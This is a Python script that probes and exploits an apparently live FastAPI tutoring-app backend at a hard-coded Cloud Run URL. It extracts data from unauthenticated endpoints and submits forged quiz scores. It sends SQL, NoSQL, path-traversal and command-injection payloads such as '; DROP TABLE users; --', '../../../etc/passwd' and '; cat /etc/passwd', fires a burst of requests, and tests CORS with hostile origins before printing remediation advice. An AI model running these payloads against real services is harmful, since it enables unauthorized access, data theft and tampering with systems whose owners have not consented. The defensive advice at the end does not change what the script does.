import requests
import json
import time
from datetime import datetime
from urllib.parse import quote

def exploit_fastapi_vulnerabilities():
    """Focused exploitation of known FastAPI vulnerabilities"""
    print("="*60)
    print("üéØ FOCUSED FASTAPI VULNERABILITY EXPLOITATION")
    print("="*60)
    
    backend_url = "https://fastapi-tutor-app-backend-208251878692.asia-south1.run.app"
    vulnerabilities = []
    
    def add_vuln(vuln_type, severity, endpoint, details, evidence):
        vulnerabilities.append({
            "type": vuln_type,
            "severity": severity,
            "endpoint": endpoint,
            "details": details,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        })
        print(f"üö® {severity}: {vuln_type} at {endpoint}")
        print(f"   ‚Üí {details}")
    
    # 1. CONFIRM NO AUTHENTICATION ON CRITICAL ENDPOINTS
    print("\nüîì [1] CONFIRMING AUTHENTICATION BYPASS...")
    
    critical_endpoints = [
        "/api/user",
        "/subjects/", 
        "/openapi.json",
        "/docs",
        "/metrics"
    ]
    
    for endpoint in critical_endpoints:
        try:
            response = requests.get(f"{backend_url}{endpoint}", timeout=5)
            
            if response.status_code == 200:
                try:
                    data = response.json() if 'json' in response.headers.get('content-type', '') else response.text
                    
                    add_vuln(
                        "No Authentication Required",
                        "CRITICAL",
                        endpoint,
                        f"Endpoint accessible without any authentication",
                        f"HTTP 200 response with data: {str(data)[:100]}..."
                    )
                    
                    # Special handling for sensitive endpoints
                    if endpoint == "/api/user":
                        print(f"     üìä User data exposed: {str(data)[:200]}...")
                    elif endpoint == "/openapi.json":
                        print(f"     üìã Complete API schema exposed!")
                    elif endpoint == "/subjects/":
                        print(f"     üìö All subjects data exposed!")
                        
                except Exception as e:
                    add_vuln(
                        "No Authentication Required",
                        "HIGH",
                        endpoint,
                        f"Endpoint accessible, content type: {response.headers.get('content-type')}",
                        f"HTTP 200 response"
                    )
                    
        except Exception as e:
            print(f"   ‚ùå Error testing {endpoint}: {str(e)}")
    
    # 2. EXTRACT ALL EXPOSED DATA
    print("\nüìä [2] EXTRACTING ALL EXPOSED DATA...")
    
    data_endpoints = [
        "/math/topics/",
        "/math/algebra/subtopics/", 
        "/English/topics/",
        "/English/grammar/subtopics/",
        "/Science/topics/",
        "/History/topics/"
    ]
    
    exposed_data = {}
    
    for endpoint in data_endpoints:
        try:
            response = requests.get(f"{backend_url}{endpoint}", timeout=5)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data:
                        exposed_data[endpoint] = data
                        
                        add_vuln(
                            "Data Exposure Without Authentication",
                            "HIGH",
                            endpoint,
                            f"Educational content exposed without authentication",
                            f"Retrieved {len(data) if isinstance(data, list) else 'structured'} data items"
                        )
                        
                        print(f"   üìö {endpoint}: {len(data) if isinstance(data, list) else 'Data'} items extracted")
                        
                except Exception as e:
                    pass
                    
        except Exception as e:
            continue
    
    # 3. TEST BUSINESS LOGIC BYPASS
    print("\nüîÑ [3] TESTING BUSINESS LOGIC BYPASS...")
    
    # Can we submit quiz results without taking quiz?
    quiz_endpoints = [
        ("/quiz1/", {"answers": {"1": "A", "2": "B", "3": "C"}}),
        ("/math/algebra/basics/quiz/", {"subject": "math", "topic": "algebra", "answers": {"1": "A"}}),
        ("/quiz_results/", {"score": 100, "total": 100, "percentage": 100}),
    ]
    
    for endpoint, payload in quiz_endpoints:
        try:
            response = requests.post(f"{backend_url}{endpoint}", json=payload, timeout=5)
            
            if response.status_code in [200, 201]:
                try:
                    result = response.json()
                    add_vuln(
                        "Business Logic Bypass",
                        "HIGH",
                        endpoint,
                        "Can submit quiz/results without proper authentication flow",
                        f"Payload accepted: {payload}"
                    )
                    print(f"   üéØ Quiz bypass successful: {str(result)[:100]}...")
                    
                except Exception as e:
                    add_vuln(
                        "Business Logic Bypass",
                        "MEDIUM",
                        endpoint,
                        "Endpoint accepts unauthorized submissions",
                        f"HTTP {response.status_code} response"
                    )
                    
        except Exception as e:
            continue
    
    # 4. TEST PARAMETER INJECTION
    print("\nüíâ [4] TESTING PARAMETER INJECTION...")
    
    injection_tests = [
        # SQL injection attempts
        ("/api/user", {"id": "1' OR '1'='1"}),
        ("/select/", {"subject": "'; DROP TABLE users; --", "topic": "test"}),
        
        # NoSQL injection
        ("/api/user", {"id": {"$ne": None}}),
        ("/select/", {"subject": {"$gt": ""}, "topic": "test"}),
        
        # Path traversal
        ("/api/user", {"file": "../../../etc/passwd"}),
        ("/select/", {"subject": "../../../../etc/hosts", "topic": ".."}),
        
        # Command injection
        ("/api/user", {"cmd": "; cat /etc/passwd"}),
        ("/select/", {"subject": "test; whoami", "topic": "test"}),
    ]
    
    for endpoint, payload in injection_tests:
        try:
            if endpoint == "/api/user":
                # GET request with query params
                params = "&".join([f"{k}={quote(str(v))}" for k, v in payload.items()])
                response = requests.get(f"{backend_url}{endpoint}?{params}", timeout=5)
            else:
                # POST request with JSON
                response = requests.post(f"{backend_url}{endpoint}", json=payload, timeout=5)
            
            if response:
                # Check for injection indicators
                response_text = response.text.lower()
                
                # SQL injection indicators
                sql_indicators = ['syntax error', 'mysql', 'postgres', 'sqlite', 'query failed', 'database']
                found_sql = [ind for ind in sql_indicators if ind in response_text]
                
                # Command injection indicators  
                cmd_indicators = ['root:', '/bin/', 'uid=', 'gid=', 'bash', 'sh']
                found_cmd = [ind for ind in cmd_indicators if ind in response_text]
                
                # File access indicators
                file_indicators = ['etc/passwd', 'etc/hosts', 'windows', 'system32']
                found_file = [ind for ind in file_indicators if ind in response_text]
                
                all_indicators = found_sql + found_cmd + found_file
                
                if all_indicators:
                    severity = "CRITICAL" if found_cmd or found_file else "HIGH"
                    add_vuln(
                        "Injection Vulnerability",
                        severity,
                        endpoint,
                        f"Application vulnerable to injection attacks",
                        f"Indicators found: {all_indicators}, Payload: {payload}"
                    )
                    
        except Exception as e:
            continue
    
    # 5. TEST RATE LIMITING AND DOS
    print("\n‚ö° [5] TESTING RATE LIMITING AND DOS...")
    
    # Quick rate limiting test
    start_time = time.time()
    success_count = 0
    
    for i in range(50):
        try:
            response = requests.get(f"{backend_url}/api/user", timeout=1)
            if response and response.status_code == 200:
                success_count += 1
        except:
            pass
    
    elapsed = time.time() - start_time
    
    if success_count >= 45:  # More than 90% success rate
        add_vuln(
            "No Rate Limiting",
            "MEDIUM",
            "/api/user",
            f"No rate limiting detected - {success_count}/50 requests succeeded in {elapsed:.2f}s",
            f"High request success rate indicates missing rate limiting"
        )
    
    # 6. TEST CORS MISCONFIGURATION
    print("\nüåê [6] TESTING CORS MISCONFIGURATION...")
    
    cors_origins = ["https://evil.com", "http://attacker.local", "null"]
    
    for origin in cors_origins:
        try:
            headers = {"Origin": origin}
            response = requests.options(f"{backend_url}/api/user", headers=headers, timeout=5)
            
            if response:
                cors_header = response.headers.get('access-control-allow-origin', '')
                if cors_header == "*" or origin in cors_header:
                    add_vuln(
                        "CORS Misconfiguration",
                        "MEDIUM",
                        "/api/user",
                        f"CORS allows unauthorized origin: {origin}",
                        f"Access-Control-Allow-Origin: {cors_header}"
                    )
                    break
                    
        except Exception as e:
            continue
    
    # GENERATE EXPLOITATION REPORT
    print("\n" + "="*60)
    print("üìã EXPLOITATION REPORT")
    print("="*60)
    
    if vulnerabilities:
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for vuln in vulnerabilities:
            severity_counts[vuln["severity"]] += 1
        
        print(f"\nüö® TOTAL VULNERABILITIES EXPLOITED: {len(vulnerabilities)}")
        print(f"   Critical: {severity_counts['CRITICAL']}")
        print(f"   High: {severity_counts['HIGH']}")
        print(f"   Medium: {severity_counts['MEDIUM']}")
        print(f"   Low: {severity_counts['LOW']}")
        
        print(f"\nüî• CRITICAL BUSINESS IMPACT:")
        critical_vulns = [v for v in vulnerabilities if v["severity"] == "CRITICAL"]
        if critical_vulns:
            print("- Complete authentication bypass")
            print("- Unrestricted access to user data")
            print("- Business logic manipulation possible")
            print("- Competitor intelligence gathering possible")
        
        print(f"\nüí∞ EXPLOITATION VALUE FOR ATTACKERS:")
        if exposed_data:
            print(f"- Access to complete course structure ({len(exposed_data)} endpoints)")
            print("- User information without authentication")
            print("- Business intelligence and competitive data")
            print("- Ability to manipulate quiz results")
        
        print(f"\nüö® IMMEDIATE ACTIONS REQUIRED:")
        print("1. üî• Add authentication middleware to ALL API endpoints")
        print("2. üî• Disable /docs and /openapi.json in production")
        print("3. ‚ö†Ô∏è  Implement rate limiting immediately")
        print("4. ‚ö†Ô∏è  Add input validation and sanitization")
        print("5. ‚ö†Ô∏è  Configure proper CORS policy")
        print("6. ‚ÑπÔ∏è  Add comprehensive logging and monitoring")
        
        # Save detailed exploitation report
        report = {
            "exploitation_date": datetime.now().isoformat(),
            "target": backend_url,
            "total_vulnerabilities": len(vulnerabilities),
            "severity_breakdown": severity_counts,
            "vulnerabilities": vulnerabilities,
            "exposed_data_endpoints": list(exposed_data.keys()),
            "business_impact": "CRITICAL - Complete authentication bypass",
            "recommendations": [
                "Implement FastAPI dependency injection for authentication",
                "Add JWT token validation middleware",
                "Disable API documentation in production",
                "Implement rate limiting with slowapi or similar",
                "Add input validation with Pydantic models",
                "Configure CORS to only allow frontend domain",
                "Add comprehensive security headers",
                "Implement proper error handling"
            ]
        }
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"fastapi_exploitation_report_{timestamp}.json"
        
        with open(filename, "w") as f:
            json.dump(report, f, indent=2)
        
        print(f"\n‚úÖ Detailed exploitation report saved: {filename}")
        
        return report
        
    else:
        print("\n‚úÖ No vulnerabilities could be exploited!")
        return None

if __name__ == "__main__":
    exploit_fastapi_vulnerabilities()